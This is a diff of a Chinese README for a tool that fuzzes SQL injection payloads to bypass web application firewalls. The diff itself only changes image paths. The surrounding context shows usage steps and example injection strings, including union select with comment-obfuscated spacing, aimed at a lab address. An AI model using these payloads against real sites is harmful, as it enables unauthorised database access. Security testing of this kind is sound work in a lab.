@@ -26,12 +26,12 @@ sql_Bypass_WAF是一款sql注入绕waf工具，通过fuzz的方式，进行大�
 ---
 1. -h查看参数帮助
 
-![](../images/文章/sql注入bypass_waf工具/8.png)
+![](./images/8.png)
 
 
 2. 先判断出waf拦截的sql恶意语句。
 ---
-![](../images/文章/sql注入bypass_waf工具/1.png)
+![](./images/1.png)
 
 3. 再将想要Bypass的语句带入到工具中，注意带入到工具中的url为waf拦截的url。
 ---
@@ -47,10 +47,10 @@ http://192.168.170.133/sqli/less-1/?id=1' ~and~ 1=1 --+
 sql_Bypass_WAF.exe -s "http://192.168.170.133/sqli/less-1/?id=1' ~and~ 1=1 --+"
 ```
 
-![](../images/文章/sql注入bypass_waf工具/2.png)
+![](./images/2.png)
 
 
-![](../images/文章/sql注入bypass_waf工具/3.png)
+![](./images/3.png)
 
 如果为两个参数，在两个参数中间加"^"，如
 ```
@@ -65,9 +65,9 @@ sql_Bypass_WAF.exe -s "http://192.168.170.133/sqli/less-1/?id=1' order^by 1 --+"
 ```
 
 
-![](../images/文章/sql注入bypass_waf工具/4.png)
+![](./images/4.png)
 
-![](../images/文章/sql注入bypass_waf工具/5.png)
+![](./images/5.png)
 
 暂不支持超过两个参数的fuzz，但可以拆分依次带入测试，如：
 
@@ -85,9 +85,9 @@ http://192.168.170.133/sqli/less-1/?id=-1' union/*////%//select 1,database^(),3 
 
 ```
 
-![](../images/文章/sql注入bypass_waf工具/6.png)
+![](./images/6.png)
 
-![](../images/文章/sql注入bypass_waf工具/7.png)
+![](./images/7.png)
 
 
 
